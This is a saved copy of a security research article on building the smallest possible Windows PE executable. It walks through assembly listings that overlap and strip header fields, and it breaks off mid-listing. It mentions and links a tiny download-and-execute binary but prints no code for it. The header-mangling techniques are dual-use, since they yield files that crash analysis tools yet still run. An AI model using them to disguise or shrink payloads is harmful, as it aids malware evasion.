@@ -1,0 +1,2089 @@
+From: <Saved by Blink>
+Snapshot-Content-Location: http://www.phreedom.org/research/tinype/
+Subject: Tiny PE
+Date: Sun, 7 Dec 2025 21:20:36 -0500
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	type="text/html";
+	boundary="----MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----"
+
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: text/html
+Content-ID: <frame-F8E7C632C81E60F5344EA40A0C8A82BC@mhtml.blink>
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://www.phreedom.org/research/tinype/
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/htm=
+l4/strict.dtd"><html lang=3D"en"><head><meta http-equiv=3D"Content-Type" co=
+ntent=3D"text/html; charset=3DUTF-8"><link rel=3D"stylesheet" type=3D"text/=
+css" href=3D"cid:css-7b5893d9-e12c-47c9-9df9-9eff51c424d7@mhtml.blink" /><l=
+ink rel=3D"stylesheet" type=3D"text/css" href=3D"cid:css-18fbbcbf-765f-4a5c=
+-905c-f950cd28c554@mhtml.blink" /><link rel=3D"stylesheet" type=3D"text/css=
+" href=3D"cid:css-d5f9b8e8-d910-40ad-94c6-a8cf1d96920e@mhtml.blink" /><link=
+ rel=3D"stylesheet" type=3D"text/css" href=3D"cid:css-9093cf60-0d85-41c7-92=
+f1-377e507d3f6f@mhtml.blink" />
+
+<title>Tiny PE</title>
+
+
+
+<!--[if lt IE 8]>
+			<link rel=3D"stylesheet" href=3D"../../ie7.css" type=3D"text/css"/>
+		<![endif]--><!--[if lt IE 7]>
+			<link rel=3D"stylesheet" href=3D"../../ie6.css" type=3D"text/css"/>
+		<![endif]--><!--[if lt IE 6]>
+			<link rel=3D"stylesheet" href=3D"../../ie5.css" type=3D"text/css"/>
+		<![endif]--><link rel=3D"alternate" type=3D"application/atom+xml" href=3D=
+"http://www.phreedom.org/blog/atom.xml">
+</head>
+<body>
+<div id=3D"page"><div class=3D"page-top"><div class=3D"page-left"><div clas=
+s=3D"page-bottom"><div class=3D"page-right"><div class=3D"page-topleft"><di=
+v class=3D"page-topright"><div class=3D"page-bottomright"><div class=3D"pag=
+e-bottomleft"><div class=3D"page-content">
+<div id=3D"header">
+<h1>Security Research</h1>
+<p class=3D"subtitle">by Alexander Sotirov</p>
+</div>
+<div id=3D"navbar" style=3D"clear:both">
+<h2>Navigation</h2>
+<div class=3D"navbar-topleft"><div class=3D"navbar-topright"><div class=3D"=
+navbar-bottomright"><div class=3D"navbar-bottomleft"><div class=3D"navbar-c=
+ontent">
+<ul class=3D"menu">
+<li><a href=3D"http://www.phreedom.org/">Blog</a></li>
+<li class=3D"current"><a href=3D"http://www.phreedom.org/research/">Researc=
+h</a></li>
+<li><a href=3D"http://www.phreedom.org/presentations/">Presentations</a></l=
+i>
+<li><a href=3D"http://www.phreedom.org/software/">Software</a></li>
+<li><a href=3D"http://www.phreedom.org/about/">About</a></li>
+</ul>
+<form class=3D"search" action=3D"http://www.google.com/cse" method=3D"get">=
+<div>
+<input id=3D"search-text" type=3D"text" name=3D"q" size=3D"20" maxlength=3D=
+"256" title=3D"Search query" style=3D"color: rgb(128, 128, 128);"><input id=
+=3D"search-image" type=3D"image" name=3D"sa" value=3D"Search" src=3D"http:/=
+/www.phreedom.org/images/find.png" alt=3D"Submit">
+</div></form>
+</div></div></div></div></div>
+</div>
+<div id=3D"sidebar">
+<h2>Resources</h2>
+<h3>Latest posts</h3>
+<ul class=3D"latest">
+<li><a href=3D"http://www.phreedom.org/blog/2011/assured-exploitation-2011/=
+">Assured Exploitation 2011</a></li>
+<li><a href=3D"http://www.phreedom.org/blog/2011/you-should-work-for-symant=
+ec/">You Should Work for Symantec</a></li>
+<li><a href=3D"http://www.phreedom.org/blog/2010/csaw-final-challenge/">CSA=
+W final challenge</a></li>
+<li><a href=3D"http://www.phreedom.org/blog/2010/csaw-reversing-challenge/"=
+>CSAW reversing challenge</a></li>
+<li><a href=3D"http://www.phreedom.org/blog/2010/darknet-design/">Darknet d=
+esign</a></li>
+</ul>
+<h3>Archives</h3>
+<ul><li>
+<a href=3D"http://www.phreedom.org/blog/2011/">2011</a>
+							|
+						<a href=3D"http://www.phreedom.org/blog/2010/">2010</a>
+							|
+						<a href=3D"http://www.phreedom.org/blog/2009/">2009</a>
+							|
+						<a href=3D"http://www.phreedom.org/blog/2008/">2008</a>
+</li></ul>
+<h3>Follow</h3>
+<ul>
+<li><a class=3D"external" href=3D"http://twitter.com/alexsotirov/">Twitter<=
+/a></li>
+<li><a href=3D"http://www.phreedom.org/blog/atom.xml">Blog feed <img src=3D=
+"http://www.phreedom.org/images/feed.png" width=3D"12px" height=3D"12px" al=
+t=3D"Feed icon"></a></li>
+</ul>
+<h3>Contact</h3>
+<ul>
+<li><a href=3D"mailto:alex@sotirov.net">alex@sotirov.net</a></li>
+<li><a href=3D"http://www.phreedom.org/asotirov.pgp">PGP key</a></li>
+</ul>
+<h3>Meet me at</h3>
+<ul class=3D"comingup">
+<li>
+<a class=3D"external" href=3D"http://www.cansecwest.com/">CanSecWest</a><p =
+class=3D"location">Vancouver, Mar 9-11</p>
+</li>
+<li>
+<a class=3D"external" href=3D"https://www.immunityinc.com/infiltrate.shtml"=
+>Infiltrate</a><p class=3D"location">Miami Beach, Apr 16-17</p>
+</li>
+</ul>
+</div>
+<div id=3D"content">
+
+<h2>Tiny PE</h2>
+
+<p>Translations: <a href=3D"http://www.fergonez.net/tinype.html">portugu=C3=
+=AAs brasileiro</a></p>
+
+<h3>Creating the smallest possible PE executable</h3>
+
+<p>This work was inspired by the Tiny PE <a href=3D"http://blogs.securiteam=
+.com/index.php/archives/675">challenge</a>
+by Gil Dabah. The object of the challenge was to write the smallest PE file
+that downloads a file from the Internet and executes it.</p>
+
+
+
+<p>In the process of writing increasingly smaller PE files for the challeng=
+e I
+learned a lot of interesting details about the PE file format and the Windo=
+ws
+loader. The goal of this document is to preserve this knowledge for future =
+reference. In this,
+I have followed the example of the famous <a href=3D"http://www.muppetlabs.=
+com/~breadbox/software/tiny/teensy.html">Whirlwind Tutorial on Creating Rea=
+lly Teensy ELF Executables for Linux</a>.</p>
+
+<h3>Summary</h3>
+
+<p>If you are too busy to read the entire page, here is a summary of the
+results:</p>
+
+<ul>
+    <li>Smallest possible PE file: <a href=3D"http://www.phreedom.org/resea=
+rch/tinype/tiny.97">97 bytes</a>
+</li>
+    <li>Smallest possible PE file on Windows 2000: <a href=3D"http://www.ph=
+reedom.org/research/tinype/tiny.import.133">133 bytes</a>
+</li>
+    <li>Smallest PE file that downloads a file over WebDAV and executes it:=
+ <a href=3D"http://www.phreedom.org/research/tinype/tiny.webdav.133">133 by=
+tes</a>
+</li>
+</ul>
+
+<p>The files above are the smallest possible PE files due to requirements o=
+f
+the PE file format and cannot be improved further. Take this as a challenge=
+ if
+you wish ;-)</p>
+
+<p><b>UPDATE:</b> Many before me had made similar claims and just like them=
+ I
+turned out to be wrong. Thanks to Peter Ferrie for pointing out that you ca=
+n
+remove the last field from the 137 byte file and bring the file size down t=
+o
+133 bytes.</p>
+
+<p>You can also download an archive with all source code and executables fr=
+om
+this page:</p>
+
+<ul>
+    <li>
+<a href=3D"http://www.phreedom.org/research/tinype/tinype.zip">tinype.zip</=
+a>
+        (GPG <a href=3D"http://www.phreedom.org/research/tinype/tinype.zip.=
+sig">.sig</a>)</li>
+</ul>
+
+<p>For details about how these results were achieved, read below.</p>
+
+
+<h2>Smallest possible PE file</h2>
+
+<p>Our first task will be to build the smallest possible PE file that can b=
+e
+loaded and executed by Windows. We'll start with a simple C program:</p>
+
+
+<h3>Compiling a simple C program</h3>
+
+<pre class=3D"code">int main()
+{
+    return 42;
+}
+</pre>
+
+<p>We'll compile and link this program with Visual Studio 2005:</p>
+
+<pre class=3D"code">cl /nologo /c tiny.c
+link /nologo tiny.obj
+</pre>
+
+<p>The resulting file size is <b>45056</b> bytes. This is clearly unaccepta=
+ble.</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.c.45056/tiny.c"=
+>tiny.c</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.c.45056/tiny.ex=
+e">tiny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.c.45056/tiny.du=
+mp">dumpbin</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.c.45056/Makefil=
+e">Makefile</a>
+</p>
+
+
+<h3>Removing the C Runtime Library</h3>
+
+<p>A very large part of the binary consists of the C Runtime Library. If
+we link the same program with the <span class=3D"code">/NODEFAULTLIB</span>
+option, we'll get a much smaller output file. We will also remove the conso=
+le
+window from the program by setting the subsystem to Win32 GUI.</p>
+
+<pre class=3D"code">cl /nologo /c /O1 tiny.c
+link /nologo /ENTRY:main /NODEFAULTLIB /SUBSYSTEM:WINDOWS tiny.obj
+</pre>
+
+<p>The <span class=3D"code">/O1</span> compiler option optimizes the code f=
+or
+size. A disassembly of the .text section shows that main function was optim=
+ized
+down to 4 bytes:</p>
+
+<pre class=3D"code">00401000: 6A 2A              push        2Ah
+00401002: 58                 pop         eax
+00401003: C3                 ret
+</pre>
+
+<p>The size of the PE file is now <b>1024</b> bytes.</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.c.1024/tiny.c">=
+tiny.c</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.c.1024/tiny.exe=
+">tiny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.c.1024/tiny.dum=
+p">dumpbin</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.c.1024/Makefile=
+">Makefile</a>
+</p>
+
+
+<h3>Decreasing the file alignment</h3>
+
+<p>If we look at the dumpbin <a href=3D"http://www.phreedom.org/research/ti=
+nype/tiny.c.1024/tiny.dump">output</a> for the
+1024 byte file, we'll see that the file alignment is set to 512 bytes. The
+contents of the .text section start at offset 0x200 in the file. The space
+between the header and the .text section is filled with zeros.</p>
+
+<p>The official PE specification states that the minimim file alignment is =
+512,
+but the Microsoft linker can produce PE files with smaller alignment. The
+Windows loader ignores the invalid alignment and is able to execute the fil=
+e.
+</p>
+
+<pre class=3D"code">cl /c /O1 tiny.c
+link /nologo /ENTRY:main /NODEFAULTLIB /SUBSYSTEM:WINDOWS /ALIGN:1 tiny.obj
+</pre>
+
+<p>The size of the PE file is now <b>468</b> bytes.</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.c.468/tiny.c">t=
+iny.c</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.c.468/tiny.exe"=
+>tiny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.c.468/tiny.dump=
+">dumpbin</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.c.468/Makefile"=
+>Makefile</a>
+</p>
+
+
+<h3>Switching to assembly and removing the DOS stub</h3>
+
+<p>To shrink the file even further, we need to be able to edit all fields i=
+n
+the PE header. We'll disassemble our 468 byte C program and convert it to
+assembly source that can be assembled with
+<a href=3D"http://www.kernel.org/pub/software/devel/nasm/">NASM</a>. We'll =
+use
+the following command to build our PE file:</p>
+
+<pre class=3D"code">nasm -f bin -o tiny.exe tiny.asm
+</pre>
+
+<p>The only change we'll make is to remove the DOS stub that prints the mes=
+sage
+<span class=3D"code">This program cannot be run in DOS mode.</span> PE file=
+s
+still need an MZ header, but the only two fields that are used are e_magic =
+and
+e_lfanew. We can fill the rest of the MZ header with zeros. Similarly, ther=
+e
+are many other unused fields in the PE header that can be modified without
+breaking the program. In the source code below they are highlighted in red.=
+</p>
+
+<p>For a detailed description of the PE file format, please refer to the
+official <a href=3D"http://download.microsoft.com/download/9/c/5/9c5b2167-8=
+017-4bae-9fde-d599bac8184a/pecoff_v8.doc">specification</a> from Microsoft
+and Matt Pietrek's <i>An In-Depth Look into the Win32 Portable Executable F=
+ile
+Format</i>: <a href=3D"http://msdn.microsoft.com/msdnmag/issues/02/02/PE/pr=
+int.asp">Part 1</a>
+and <a href=3D"http://msdn.microsoft.com/msdnmag/issues/02/03/PE2/print.asp=
+">Part 2</a>.</p>
+
+<pre class=3D"code">; tiny.asm
+
+BITS 32
+
+;
+; MZ header
+;
+; The only two fields that matter are e_magic and e_lfanew
+
+mzhdr:
+    dw "MZ"                       ; e_magic
+<span style=3D"color: red;">    dw 0                          ; e_cblp UNUS=
+ED</span>
+<span style=3D"color: red;">    dw 0                          ; e_cp UNUSED=
+</span>
+<span style=3D"color: red;">    dw 0                          ; e_crlc UNUS=
+ED</span>
+<span style=3D"color: red;">    dw 0                          ; e_cparhdr U=
+NUSED</span>
+<span style=3D"color: red;">    dw 0                          ; e_minalloc =
+UNUSED</span>
+<span style=3D"color: red;">    dw 0                          ; e_maxalloc =
+UNUSED</span>
+<span style=3D"color: red;">    dw 0                          ; e_ss UNUSED=
+</span>
+<span style=3D"color: red;">    dw 0                          ; e_sp UNUSED=
+</span>
+<span style=3D"color: red;">    dw 0                          ; e_csum UNUS=
+ED</span>
+<span style=3D"color: red;">    dw 0                          ; e_ip UNUSED=
+</span>
+<span style=3D"color: red;">    dw 0                          ; e_cs UNUSED=
+</span>
+<span style=3D"color: red;">    dw 0                          ; e_lsarlc UN=
+USED</span>
+<span style=3D"color: red;">    dw 0                          ; e_ovno UNUS=
+ED</span>
+<span style=3D"color: red;">    times 4 dw 0                  ; e_res UNUSE=
+D</span>
+<span style=3D"color: red;">    dw 0                          ; e_oemid UNU=
+SED</span>
+<span style=3D"color: red;">    dw 0                          ; e_oeminfo U=
+NUSED</span>
+<span style=3D"color: red;">    times 10 dw 0                 ; e_res2 UNUS=
+ED</span>
+    dd pesig                      ; e_lfanew
+
+;
+; PE signature
+;
+
+pesig:
+    dd "PE"
+
+;
+; PE header
+;
+
+pehdr:
+    dw 0x014C                     ; Machine (Intel 386)
+    dw 1                          ; NumberOfSections
+<span style=3D"color: red;">    dd 0x4545BE5D                 ; TimeDateSta=
+mp UNUSED</span>
+<span style=3D"color: red;">    dd 0                          ; PointerToSy=
+mbolTable UNUSED</span>
+<span style=3D"color: red;">    dd 0                          ; NumberOfSym=
+bols UNUSED</span>
+    dw opthdrsize                 ; SizeOfOptionalHeader
+    dw 0x103                      ; Characteristics (no relocations, execut=
+able, 32 bit)
+
+;
+; PE optional header
+;
+
+filealign equ 1
+sectalign equ 1
+
+%define round(n, r) (((n+(r-1))/r)*r)
+
+opthdr:
+    dw 0x10B                      ; Magic (PE32)
+<span style=3D"color: red;">    db 8                          ; MajorLinker=
+Version UNUSED</span>
+<span style=3D"color: red;">    db 0                          ; MinorLinker=
+Version UNUSED</span>
+<span style=3D"color: red;">    dd round(codesize, filealign) ; SizeOfCode =
+UNUSED</span>
+<span style=3D"color: red;">    dd 0                          ; SizeOfIniti=
+alizedData UNUSED</span>
+<span style=3D"color: red;">    dd 0                          ; SizeOfUnini=
+tializedData UNUSED</span>
+    dd start                      ; AddressOfEntryPoint
+<span style=3D"color: red;">    dd code                       ; BaseOfCode =
+UNUSED</span>
+<span style=3D"color: red;">    dd round(filesize, sectalign) ; BaseOfData =
+UNUSED</span>
+    dd 0x400000                   ; ImageBase
+    dd sectalign                  ; SectionAlignment
+    dd filealign                  ; FileAlignment
+<span style=3D"color: red;">    dw 4                          ; MajorOperat=
+ingSystemVersion UNUSED</span>
+<span style=3D"color: red;">    dw 0                          ; MinorOperat=
+ingSystemVersion UNUSED</span>
+<span style=3D"color: red;">    dw 0                          ; MajorImageV=
+ersion UNUSED</span>
+<span style=3D"color: red;">    dw 0                          ; MinorImageV=
+ersion UNUSED</span>
+    dw 4                          ; MajorSubsystemVersion
+<span style=3D"color: red;">    dw 0                          ; MinorSubsys=
+temVersion UNUSED</span>
+<span style=3D"color: red;">    dd 0                          ; Win32Versio=
+nValue UNUSED</span>
+    dd round(filesize, sectalign) ; SizeOfImage
+    dd round(hdrsize, filealign)  ; SizeOfHeaders
+<span style=3D"color: red;">    dd 0                          ; CheckSum UN=
+USED</span>
+    dw 2                          ; Subsystem (Win32 GUI)
+<span style=3D"color: red;">    dw 0x400                      ; DllCharacte=
+ristics UNUSED</span>
+<span style=3D"color: red;">    dd 0x100000                   ; SizeOfStack=
+Reserve UNUSED</span>
+    dd 0x1000                     ; SizeOfStackCommit
+    dd 0x100000                   ; SizeOfHeapReserve
+<span style=3D"color: red;">    dd 0x1000                     ; SizeOfHeapC=
+ommit UNUSED</span>
+<span style=3D"color: red;">    dd 0                          ; LoaderFlags=
+ UNUSED</span>
+<span style=3D"color: red;">    dd 16                         ; NumberOfRva=
+AndSizes UNUSED</span>
+
+;
+; Data directories
+;
+
+    times 16 dd 0, 0
+
+opthdrsize equ $ - opthdr
+
+;
+; PE code section
+;
+
+    db ".text", 0, 0, 0           ; Name
+    dd codesize                   ; VirtualSize
+    dd round(hdrsize, sectalign)  ; VirtualAddress
+    dd round(codesize, filealign) ; SizeOfRawData
+    dd code                       ; PointerToRawData
+<span style=3D"color: red;">    dd 0                          ; PointerToRe=
+locations UNUSED</span>
+<span style=3D"color: red;">    dd 0                          ; PointerToLi=
+nenumbers UNUSED</span>
+<span style=3D"color: red;">    dw 0                          ; NumberOfRel=
+ocations UNUSED</span>
+<span style=3D"color: red;">    dw 0                          ; NumberOfLin=
+enumbers UNUSED</span>
+<span style=3D"color: red;">    dd 0x60000020                 ; Characteris=
+tics (code, execute, read) UNUSED</span>
+
+hdrsize equ $ - $$
+
+;
+; PE code section data
+;
+
+align filealign, db 0
+
+code:
+
+; Entry point
+
+start:
+    push byte 42
+    pop eax
+    ret
+
+codesize equ $ - code
+
+filesize equ $ - $$
+</pre>
+
+<p>To find out which fields are used and which can be freely modified, we
+used a simple <a href=3D"http://www.phreedom.org/research/tinype/unused.rb"=
+>asm fuzzer</a> written in Ruby. It iterates
+through all header fields in the assembly source and replaces them with
+semi-random values. If the resulting program crashes or fails to return 42,=
+ we
+conclude that the field is in use.</p>
+
+<p>The size of the assembled PE file is now <b>356</b> bytes.</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.356/tiny.asm">t=
+iny.asm</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.356/tiny.exe">t=
+iny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.356/tiny.dump">=
+dumpbin</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.356/Makefile">M=
+akefile</a>
+</p>
+
+
+<h3>Collapsing the MZ header</h3>
+
+<p>The e_lfanew field in the MZ header contains the offset of the PE header
+from the beginning of the file. Usually the PE header begins after the MZ
+header and the DOS stub, but if we set e_lfanew to a value smaller than the
+0x40, the PE header will start inside the MZ header. This allows us to merg=
+e
+some of the data of the MZ and PE headers and produce a smaller file.</p>
+
+<p>The PE header cannot start at offset 0, because we need the first two by=
+tes
+of the file to be "MZ". According to the PE specification, the PE header mu=
+st
+be aligned on a 8 byte boundary, but the Windows loader requires only a 4 b=
+yte
+alignment. This means that the smallest possible value for e_lfanew is 4.</=
+p>
+
+<p>If the PE header starts at offset 4, most of it will overwrite unused fi=
+elds
+in the MZ header. The only field we need to be careful with is e_lfanew, wh=
+ich
+is at the same offset as SectionAlignment. Since e_lfanew must be 4, we hav=
+e to
+set SectionAlignment to 4 as well. The PE specification says that if the
+section alignment is less than the page size, the file alignment must have =
+the
+same value, so we have to set both SectionAlignment and FileAlignment to 4.
+Fortunately the section data in our PE file is already aligned on a 4 byte
+boundary, so changing the file alignment from 1 to 4 doesn't increase the f=
+ile
+size.</p>
+
+<pre class=3D"code">;
+; MZ header
+;
+; The only two fields that matter are e_magic and e_lfanew
+
+mzhdr:
+    dw "MZ"       ; e_magic
+<span style=3D"color: red;">    dw 0          ; e_cblp UNUSED</span>
+
+;
+; PE signature
+;
+
+pesig:
+    dd "PE"       ; e_cp, e_crlc UNUSED       ; PE signature
+
+;
+; PE header
+;
+
+pehdr:
+    dw 0x014C     ; e_cparhdr UNUSED          ; Machine (Intel 386)
+    dw 1          ; e_minalloc UNUSED         ; NumberOfSections
+<span style=3D"color: red;">    dd 0x4545BE5D ; e_maxalloc, e_ss UNUSED   ;=
+ TimeDateStamp UNUSED</span>
+<span style=3D"color: red;">    dd 0          ; e_sp, e_csum UNUSED       ;=
+ PointerToSymbolTable UNUSED</span>
+<span style=3D"color: red;">    dd 0          ; e_ip, e_cs UNUSED         ;=
+ NumberOfSymbols UNUSED</span>
+    dw opthdrsize ; e_lsarlc UNUSED           ; SizeOfOptionalHeader
+    dw 0x103      ; e_ovno UNUSED             ; Characteristics
+
+;
+; PE optional header
+;
+
+filealign equ 4
+sectalign equ 4   ; must be 4 because of e_lfanew
+
+%define round(n, r) (((n+(r-1))/r)*r)
+
+opthdr:
+    dw 0x10B      ; e_res UNUSED              ; Magic (PE32)
+<span style=3D"color: red;">    db 8                                      ;=
+ MajorLinkerVersion UNUSED</span>
+<span style=3D"color: red;">    db 0                                      ;=
+ MinorLinkerVersion UNUSED</span>
+<span style=3D"color: red;">    dd round(codesize, filealign)             ;=
+ SizeOfCode UNUSED</span>
+<span style=3D"color: red;">    dd 0          ; e_oemid, e_oeminfo UNUSED ;=
+ SizeOfInitializedData UNUSED</span>
+<span style=3D"color: red;">    dd 0          ; e_res2 UNUSED             ;=
+ SizeOfUninitializedData UNUSED</span>
+    dd start                                  ; AddressOfEntryPoint
+<span style=3D"color: red;">    dd code                                   ;=
+ BaseOfCode UNUSED</span>
+<span style=3D"color: red;">    dd round(filesize, sectalign)             ;=
+ BaseOfData UNUSED</span>
+    dd 0x400000                               ; ImageBase
+    dd sectalign  ; e_lfanew                  ; SectionAlignment
+</pre>
+
+<p>Collapsing the MZ header reduces the file size to <b>296</b> bytes.</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.296/tiny.asm">t=
+iny.asm</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.296/tiny.exe">t=
+iny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.296/tiny.dump">=
+dumpbin</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.296/Makefile">M=
+akefile</a>
+</p>
+
+
+<h3>Removing the data directories</h3>
+
+<p>The data directories at the end of the PE optional header usually contai=
+n
+pointers to the import and export tables, debugging information, relocation=
+s
+and other OS specific data. Our PE file doesn't use any of these features a=
+nd
+its data directories are empty. If we can remove the data directories from =
+the
+file, we'll save a lot of space.</p>
+
+<p>The PE specification says that the number of data directories is specifi=
+ed
+in the NumberOfRvaAndSizes header field and the size of the PE optional hea=
+der
+is variable. If we set NumberOfRvaAndSizes to 0 and decrease
+SizeOfOptionalHeader, we can remove the data directories from the file.</p>
+
+<pre class=3D"code">    dd 0                                      ; NumberO=
+fRvaAndSizes
+</pre>
+
+<p>Most functions that read the data directories check if NumberOfRvaAndSiz=
+es
+is large enough to avoid accessing invalid memory. The only exception is th=
+e
+Debug directory on Windows XP. If the size of the Debug directory is not 0,
+regardless of NumberOfRvaAndSizes, the loader will crash with an access
+violation in <span class=3D"code">ntdll!LdrpCheckForSecuROMImage</span>. We=
+ need
+to ensure that the dword at offset 0x94 from the beginning of the optional
+header is always 0. In our PE file this address is outside the memory mappe=
+d
+file and is zeroed by the OS.</p>
+
+<p>The size of the PE file is only <b>168</b> bytes, a significant
+improvement.</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.168/tiny.asm">t=
+iny.asm</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.168/tiny.exe">t=
+iny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.168/tiny.dump">=
+dumpbin</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.168/Makefile">M=
+akefile</a>
+</p>
+
+
+<h3>Collapsing the PE section header</h3>
+
+<p>The Windows loader expects to find the PE section headers after the opti=
+onal
+header. It calculates the address of the first section header by adding
+SizeOfOptionalHeader to the beginning of the optional header. However, the =
+code
+that accesses the fields of the optional header never checks its size. We c=
+an
+set SizeOfOptionalHeader to a value smaller than the real size, and move th=
+e PE
+section into the unused space in the optional header. This is illustrated b=
+y
+the code below:</p>
+
+<pre class=3D"code">    dw sections-opthdr ; e_lsarlc UNUSED      ; SizeOfO=
+ptionalHeader
+    dw 0x103      ; e_ovno UNUSED             ; Characteristics
+
+;
+; PE optional header
+;
+; The debug directory size at offset 0x94 from here must be 0
+
+filealign equ 4
+sectalign equ 4   ; must be 4 because of e_lfanew
+
+%define round(n, r) (((n+(r-1))/r)*r)
+
+opthdr:
+    dw 0x10B      ; e_res UNUSED              ; Magic (PE32)
+<span style=3D"color: red;">    db 8                                      ;=
+ MajorLinkerVersion UNUSED</span>
+<span style=3D"color: red;">    db 0                                      ;=
+ MinorLinkerVersion UNUSED</span>
+
+;
+; PE code section
+;
+
+sections:
+<span style=3D"color: red;">    dd round(codesize, filealign)             ;=
+ SizeOfCode UNUSED                  ; Name UNUSED</span>
+<span style=3D"color: red;">    dd 0          ; e_oemid, e_oeminfo UNUSED ;=
+ SizeOfInitializedData UNUSED</span>
+    dd codesize   ; e_res2 UNUSED             ; SizeOfUninitializedData UNU=
+SED     ; VirtualSize
+    dd start                                  ; AddressOfEntryPoint        =
+        ; VirtualAddress
+    dd codesize                               ; BaseOfCode UNUSED          =
+        ; SizeOfRawData
+    dd start                                  ; BaseOfData UNUSED          =
+        ; PointerToRawData
+    dd 0x400000                               ; ImageBase                  =
+        ; PointerToRelocations UNUSED
+    dd sectalign  ; e_lfanew                  ; SectionAlignment           =
+        ; PointerToLinenumbers UNUSED
+    dd filealign                              ; FileAlignment              =
+        ; NumberOfRelocations, NumberOfLinenumbers UNUSED
+<span style=3D"color: red;">    dw 4                                      ;=
+ MajorOperatingSystemVersion UNUSED ; Characteristics UNUSED</span>
+<span style=3D"color: red;">    dw 0                                      ;=
+ MinorOperatingSystemVersion UNUSED</span>
+<span style=3D"color: red;">    dw 0                                      ;=
+ MajorImageVersion UNUSED</span>
+<span style=3D"color: red;">    dw 0                                      ;=
+ MinorImageVersion UNUSED</span>
+    dw 4                                      ; MajorSubsystemVersion
+<span style=3D"color: red;">    dw 0                                      ;=
+ MinorSubsystemVersion UNUSED</span>
+<span style=3D"color: red;">    dd 0                                      ;=
+ Win32VersionValue UNUSED</span>
+    dd round(filesize, sectalign)             ; SizeOfImage
+    dd round(hdrsize, filealign)              ; SizeOfHeaders
+<span style=3D"color: red;">    dd 0                                      ;=
+ CheckSum UNUSED</span>
+    dw 2                                      ; Subsystem (Win32 GUI)
+<span style=3D"color: red;">    dw 0x400                                  ;=
+ DllCharacteristics UNUSED</span>
+<span style=3D"color: red;">    dd 0x100000                               ;=
+ SizeOfStackReserve</span>
+    dd 0x1000                                 ; SizeOfStackCommit
+    dd 0x100000                               ; SizeOfHeapReserve
+<span style=3D"color: red;">    dd 0x1000                                 ;=
+ SizeOfHeapCommit UNUSED</span>
+<span style=3D"color: red;">    dd 0                                      ;=
+ LoaderFlags UNUSED</span>
+<span style=3D"color: red;">    dd 0                                      ;=
+ NumberOfRvaAndSizes UNUSED</span>
+
+hdrsize equ $ - $$
+
+;
+; PE code section data
+;
+
+align filealign, db 0
+
+; Entry point
+
+start:
+    push byte 42
+    pop eax
+    ret
+
+codesize equ $ - start
+
+filesize equ $ - $$
+</pre>
+
+<p>This kind of header mangling causes dumpbin to crash, but the WinDbg !dh
+command can still parse the header correctly. The size of the PE file is no=
+w
+<b>128</b> bytes.</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.128/tiny.asm">t=
+iny.asm</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.128/tiny.exe">t=
+iny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.128/Makefile">M=
+akefile</a>
+</p>
+
+
+<h3>The smallest possible PE file</h3>
+
+<p>The next step is obvious: we can move the 4 bytes of code into one of th=
+e
+unused fields of the header, such as the TimeDateStamp field. This leaves t=
+he
+end of optional header at the end of the PE file. It looks like we can't re=
+duce
+the file size any further, because the PE header starts at the smallest
+possible offset and has a fixed size. It is followed by the PE optional hea=
+der,
+which also starts at the smallest offset possible. All other data in the fi=
+le
+is contained within these two headers.</p>
+
+<p>Yet there is one more thing we can do. The PE file is mapped on a 4KB me=
+mory
+page. Since the file is smaller than 4KB, the rest of the page is filled wi=
+th
+zeros. If we remove the last few fields of the PE optional header from the
+file, the end of the structure will be mapped on a readable page of memory
+containing zeros. 0 is a valid value for the last seven fields of the optio=
+nal
+header, allowing us to remove them and save another 26 bytes.</p>
+
+<p>The last word in the file is the Subsystem field, which must be 2. Since
+Intel is a little-endian architecture, the first byte of the word is 2 and =
+the
+second one is 0. We can store the field as a single byte in the file and sa=
+ve
+an additional byte from the file size.</p>
+
+<p>The full source code of the final PE file is given below:</p>
+
+<pre class=3D"code">; tiny.asm
+
+BITS 32
+
+;
+; MZ header
+;
+; The only two fields that matter are e_magic and e_lfanew
+
+mzhdr:
+    dw "MZ"       ; e_magic
+<span style=3D"color: red;">    dw 0          ; e_cblp UNUSED</span>
+
+;
+; PE signature
+;
+
+pesig:
+    dd "PE"       ; e_cp, e_crlc UNUSED       ; PE signature
+
+;
+; PE header
+;
+
+pehdr:
+    dw 0x014C     ; e_cparhdr UNUSED          ; Machine (Intel 386)
+    dw 1          ; e_minalloc UNUSED         ; NumberOfSections
+
